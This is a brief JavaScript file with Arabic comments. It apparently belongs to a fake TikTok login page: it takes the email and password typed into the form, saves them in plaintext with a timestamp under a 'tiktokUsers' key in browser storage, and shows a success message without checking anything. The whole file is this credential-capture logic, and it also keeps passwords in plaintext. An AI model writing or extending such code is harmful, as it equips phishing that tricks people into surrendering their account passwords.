let users = JSON.parse(localStorage.getItem('tiktokUsers')) || [];

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!email || !password) {
        alert('❌ من فضلك املأ جميع البيانات.');
        return;
    }

    // حفظ البيانات
    users.push({ email, password, date: new Date().toLocaleString() });
    localStorage.setItem('tiktokUsers', JSON.stringify(users));

    // عرض رسالة نجاح
    document.getElementById('successMessage').style.display = 'block';
    document.getElementById('loginForm').reset();
});
